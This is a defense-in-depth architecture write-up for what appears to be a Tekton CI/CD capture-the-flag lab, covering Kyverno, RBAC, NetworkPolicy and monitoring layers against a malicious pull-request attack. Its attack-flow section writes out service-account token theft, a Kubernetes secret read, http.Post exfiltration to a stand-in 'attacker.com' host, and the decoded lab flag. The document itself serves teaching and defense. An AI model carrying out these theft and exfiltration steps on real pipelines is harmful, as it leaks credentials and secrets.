# Security Architecture - Defense in Depth

This document visualizes how the security layers work together to prevent the Tekton supply chain attack.

## 🏗️ Architecture Overview

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                        ATTACK SURFACE                                        │
│  Untrusted PR → Tekton EventListener → PipelineRun → Malicious Code Exec   │
└─────────────────────────────────────────────────────────────────────────────┘
                                    ↓
┌─────────────────────────────────────────────────────────────────────────────┐
│ LAYER 1: Admission Control (Kyverno)                                        │
│ ────────────────────────────────────────────────────────────────────────    │
│                                                                               │
│  ✓ Validates resources BEFORE they're created                               │
│  ✓ Blocks PipelineRuns with dangerous ServiceAccounts                       │
│  ✓ Warns on risky commands (go run, curl|bash)                             │
│  ✓ Audits external Git repository usage                                     │
│                                                                               │
│  Example:                                                                    │
│    PipelineRun with serviceAccountName: default → ❌ REJECTED               │
│    PipelineRun with serviceAccountName: pr-pipeline-readonly → ✅ ALLOWED   │
│                                                                               │
└─────────────────────────────────────────────────────────────────────────────┘
                                    ↓
┌─────────────────────────────────────────────────────────────────────────────┐
│ LAYER 2: Identity & Access Management (RBAC)                                │
│ ────────────────────────────────────────────────────────────────────────    │
│                                                                               │
│  ┌─────────────────────┐   ┌──────────────────────┐   ┌──────────────────┐ │
│  │ pr-pipeline-readonly│   │   main-pipeline      │   │ security-auditor │ │
│  │ (Untrusted PRs)     │   │   (Trusted main)     │   │ (Monitoring)     │ │
│  ├─────────────────────┤   ├──────────────────────┤   ├──────────────────┤ │
│  │ CAN:                │   │ CAN:                 │   │ CAN:             │ │
│  │ • Read ConfigMaps   │   │ • Read ConfigMaps    │   │ • Read all       │ │
│  │ • List Pipelines    │   │ • Read named secrets │   │   resources      │ │
│  │                     │   │ • Create deployments │   │                  │ │
│  │ CANNOT:             │   │                      │   │ CANNOT:          │ │
│  │ • Read secrets ❌   │   │ CANNOT:              │   │ • Write anything │ │
│  │ • Create pods  ❌   │   │ • Read all secrets ❌│   │                  │ │
│  │ • Modify resources❌│   │                      │   │                  │ │
│  └─────────────────────┘   └──────────────────────┘   └──────────────────┘ │
│                                                                               │
│  Impact: Even if malicious code executes, K8s API returns 403 Forbidden     │
│                                                                               │
└─────────────────────────────────────────────────────────────────────────────┘
                                    ↓
┌─────────────────────────────────────────────────────────────────────────────┐
│ LAYER 3: Network Segmentation (NetworkPolicy)                               │
│ ────────────────────────────────────────────────────────────────────────    │
│                                                                               │
│  Pipeline Pods (ctf-challenge namespace)                                    │
│  ┌─────────────────────────────────────────┐                                │
│  │                                          │                                │
│  │  Allowed Egress:                         │                                │
│  │  ✅ DNS (kube-system:53)                 │                                │
│  │  ✅ K8s API (apiserver:443)              │                                │
│  │  ✅ Gitea (gitea:3000,22)                │                                │
│  │  ✅ Same namespace pods                  │                                │
│  │                                          │                                │
│  │  Blocked Egress:                         │                                │
│  │  ❌ http://attacker.com                  │ ← Exfiltration blocked!       │
│  │  ❌ https://pastebin.com                 │                                │
│  │  ❌ Crypto mining pools                  │                                │
│  │  ❌ Any external IP                      │                                │
│  │                                          │                                │
│  └─────────────────────────────────────────┘                                │
│                                                                               │
│  Impact: http.Post("http://attacker.com", stolen) → Connection timeout      │
│                                                                               │
└─────────────────────────────────────────────────────────────────────────────┘
                                    ↓
┌─────────────────────────────────────────────────────────────────────────────┐
│ LAYER 4: Monitoring & Detection                                             │
│ ────────────────────────────────────────────────────────────────────────    │
│                                                                               │
│  ┌─────────────────┐  ┌─────────────────┐  ┌─────────────────┐             │
│  │   Kubescape     │  │   Kyverno       │  │   Audicia.io    │             │
│  │   Scanner       │  │   Reports       │  │   (RBAC Audit)  │             │
│  ├─────────────────┤  ├─────────────────┤  ├─────────────────┤             │
│  │ • NSA framework │  │ • Policy        │  │ • Analyze audit │             │
│  │ • MITRE ATT&CK  │  │   violations    │  │   logs          │             │
│  │ • CIS benchmarks│  │ • Audit mode    │  │ • Detect        │             │
│  │ • RBAC issues   │  │   warnings      │  │   anomalies     │             │
│  │ • Missing       │  │ • Compliance    │  │ • Generate      │             │
│  │   NetworkPolicy │  │   reports       │  │   minimal RBAC  │             │
│  └─────────────────┘  └─────────────────┘  └─────────────────┘             │
│                                                                               │
│  Continuous scanning detects:                                               │
│  • Overly permissive ServiceAccounts                                        │
│  • Missing network policies                                                 │
│  • Anomalous secret access patterns                                         │
│  • Non-compliant resource configurations                                    │
│                                                                               │
└─────────────────────────────────────────────────────────────────────────────┘
```

## 🔄 Attack Flow vs Defense Flow

### Without Defenses (Successful Attack)

```
1. Attacker creates PR with malicious code
   └─> tekton/malicious-payload-example.go

2. PR triggers EventListener
   └─> Creates PipelineRun with default ServiceAccount

3. Pipeline clones attacker's repository
   └─> git clone http://attacker-fork/repo.git

4. Task executes malicious code
   └─> go run ./scripts/quality-check/

5. Malicious init() function runs
   ├─> Reads: /var/run/secrets/kubernetes.io/serviceaccount/token
   └─> Calls K8s API: GET /api/v1/namespaces/ctf-challenge/secrets/ctf-flag
       └─> Response: {"data": {"flag": "RkxBR3t0M2t0MG5fcHduX3IzcXUzc3RfMXNfZDRuZzNyMHVzfQ=="}}

6. Exfiltrates stolen secret
   └─> http.Post("http://attacker.com/loot", flagData)

7. Attack complete
   └─> Flag stolen: FLAG{t3kt0n_pwn_r3qu3st_1s_d4ng3r0us}
```

### With All Defenses (Blocked Attack)

```
1. Attacker creates PR with malicious code
   └─> tekton/malicious-payload-example.go

2. PR triggers EventListener
   └─> Attempts to create PipelineRun with default ServiceAccount

   ❌ BLOCKED by Kyverno Layer 1
   └─> Error: "PR pipelines must use 'pr-pipeline-readonly' ServiceAccount"

3. Attacker fixes ServiceAccount, retries
   └─> PipelineRun with serviceAccountName: pr-pipeline-readonly

   ✅ Allowed by Kyverno

4. Pipeline clones attacker's repository
   └─> git clone http://attacker-fork/repo.git

   ⚠️  WARNING by Kyverno (audit mode)
   └─> "External Git repository detected, verify trusted source"

5. Task executes malicious code
   └─> go run ./scripts/quality-check/

   ⚠️  WARNING by Kyverno (audit mode)
   └─> "Task contains 'go run' which executes arbitrary code"

6. Malicious init() function runs
   ├─> Reads: /var/run/secrets/kubernetes.io/serviceaccount/token
   └─> Calls K8s API: GET /api/v1/namespaces/ctf-challenge/secrets/ctf-flag

   ❌ BLOCKED by RBAC Layer 2
   └─> HTTP 403 Forbidden
       "User system:serviceaccount:ctf-challenge:pr-pipeline-readonly
        cannot get resource 'secrets'"

7. Attacker tries alternative: exfiltrate environment variables
   └─> http.Post("http://attacker.com/loot", os.Environ())

   ❌ BLOCKED by NetworkPolicy Layer 3
   └─> Connection timeout (egress to attacker.com blocked)

8. Attack failed at multiple layers
   └─> Logged by Kubescape and Kyverno for investigation
```

## 📊 Defense Effectiveness Matrix

| Attack Technique | Without Defenses | Kyverno Only | RBAC Only | NetworkPolicy Only | All Layers |
|------------------|------------------|--------------|-----------|-------------------|------------|
| **Token Theft** | ✅ Success | ⚠️ Detected | ❌ Blocked | ⚠️ Detected | ❌ Blocked |
| **Secret Access via K8s API** | ✅ Success | ⚠️ Warning | ❌ Blocked | ⚠️ Detected | ❌ Blocked |
| **Exfiltration via HTTP** | ✅ Success | ⚠️ Warning | ⚠️ Possible | ❌ Blocked | ❌ Blocked |
| **Dangerous ServiceAccount** | ✅ Allowed | ❌ Blocked | ⚠️ Possible | ⚠️ Possible | ❌ Blocked |
| **External Repo Clone** | ✅ Allowed | ⚠️ Warning | ⚠️ Possible | ⚠️ Possible | ⚠️ Audited |
| **Code Execution (go run)** | ✅ Allowed | ⚠️ Warning | ⚠️ Possible | ⚠️ Possible | ⚠️ Audited |

**Legend:**
- ✅ Success = Attack succeeds
- ❌ Blocked = Attack completely prevented
- ⚠️ Detected/Warning = Attack logged but not blocked
- ⚠️ Possible = Attack may succeed depending on configuration

## 🎯 Threat Model Coverage

### Threats Addressed

| Threat | Defense Layer | Mitigation |
|--------|---------------|------------|
| **T1: Privileged SA Abuse** | Kyverno + RBAC | Only pr-pipeline-readonly allowed, no secret access |
| **T2: Secret Exfiltration** | RBAC + NetworkPolicy | Cannot read secrets, cannot send data out |
| **T3: Lateral Movement** | RBAC + NetworkPolicy | Minimal permissions, isolated network |
| **T4: Persistence** | RBAC + Kyverno | Cannot create pods/deployments |
| **T5: Supply Chain Poisoning** | Kyverno (audit) | Detects external repos, warns on risky commands |
| **T6: Container Escape** | Kyverno | Blocks privileged containers |

### Residual Risks

| Risk | Likelihood | Impact | Mitigation |
|------|------------|--------|------------|
| **DNS Tunneling** | Low | Medium | Monitor DNS queries, rate limiting |
| **Timing Attacks** | Low | Low | Audit logs analysis |
| **Policy Bypass via TOCTOU** | Very Low | Medium | Immutable images, signed commits |
| **Insider Threat** | Low | High | Code review, audit trails |
| **Zero-Day in Tekton** | Very Low | Critical | Regular updates, security monitoring |

## 🔧 Configuration Matrix

### Recommended Settings by Environment

#### Development Environment
```yaml
Kyverno:
  validationFailureAction: audit  # Warn, don't block
NetworkPolicy:
  enabled: true                    # Prevent accidental leaks
RBAC:
  serviceAccount: pr-pipeline-readonly
```

#### Staging Environment
```yaml
Kyverno:
  validationFailureAction: enforce # Block policy violations
  backgroundScan: true             # Continuous scanning
NetworkPolicy:
  enabled: true
  allowedEgress:
  - dns
  - internal-registries
RBAC:
  serviceAccount: pr-pipeline-readonly
  secretAccess: named-only         # Specific secrets by name
```

#### Production Environment
```yaml
Kyverno:
  validationFailureAction: enforce
  backgroundScan: true
  reportOnly: false
NetworkPolicy:
  enabled: true
  defaultDeny: true                # Deny all by default
  allowedEgress:
  - dns
  - internal-only
RBAC:
  serviceAccount: main-pipeline
  secretAccess: named-only
  auditLogging: true               # Audit all secret access
Monitoring:
  kubescape: enabled
  audicia: enabled
  alerting: true
```

## 📈 Metrics & Monitoring

### Key Performance Indicators (KPIs)

```
Security Posture Metrics:
├─ Policy Compliance Rate: [Target: >95%]
│  └─ Measure: kubectl get policyreport --all-namespaces | success / total
│
├─ RBAC Violations: [Target: 0/day]
│  └─ Measure: Audit log analysis (403 errors)
│
├─ Network Policy Blocks: [Target: Log all blocks]
│  └─ Measure: NetworkPolicy deny events
│
├─ Vulnerability Scan Score: [Target: >80/100]
│  └─ Measure: Kubescape scan score
│
└─ Mean Time to Detect (MTTD): [Target: <5 minutes]
   └─ Measure: Time from violation to alert
```

### Monitoring Dashboard

```
┌────────────────────────────────────────────────────────────┐
│ Supply Chain Security Dashboard                            │
├────────────────────────────────────────────────────────────┤
│                                                             │
│ Kyverno Policies:                                          │
│   Enforced: 3  │  Audit: 2  │  Violations (24h): 12       │
│                                                             │
│ Network Policy:                                            │
│   Active: 3    │  Blocks (24h): 47  │  Namespaces: 4     │
│                                                             │
│ RBAC:                                                      │
│   ServiceAccounts: 3  │  403 Errors (24h): 8              │
│                                                             │
│ Kubescape:                                                 │
│   Last Scan: 2h ago  │  Score: 87/100  │  Critical: 0    │
│                                                             │
│ Recent Alerts:                                             │
│   [WARN] External Git repo detected - PR #123             │
│   [INFO] go run usage - pipeline quality-check-142        │
│   [BLOCK] NetworkPolicy denied egress to 1.2.3.4          │
│                                                             │
└────────────────────────────────────────────────────────────┘
```

## 🎓 Learning Path

### For CTF Participants

1. **Beginner**: Understand the attack
   - Read ATTACK-ANALYSIS.md
   - Run the vulnerable pipeline
   - Steal the flag

2. **Intermediate**: Implement defenses
   - Deploy Kyverno
   - Apply network policies
   - Test that attack fails

3. **Advanced**: Break the defenses
   - Find policy gaps
   - Attempt DNS tunneling
   - Discover TOCTOU races

### For DevOps Engineers

1. **Phase 1**: Assessment
   - Scan existing pipelines with Kubescape
   - Review ServiceAccount permissions
   - Identify overly broad RBAC

2. **Phase 2**: Implementation
   - Deploy Kyverno in audit mode
   - Create minimal ServiceAccounts
   - Apply network policies gradually

3. **Phase 3**: Enforcement
   - Switch Kyverno to enforce mode
   - Enable continuous scanning
   - Set up alerting

## 🔗 References

- [Kyverno Best Practices](https://kyverno.io/docs/writing-policies/best-practices/)
- [Kubernetes Network Policies](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [RBAC Good Practices](https://kubernetes.io/docs/concepts/security/rbac-good-practices/)
- [SLSA Framework](https://slsa.dev/)
- [NIST SSDF](https://csrc.nist.gov/publications/detail/sp/800-218/final)
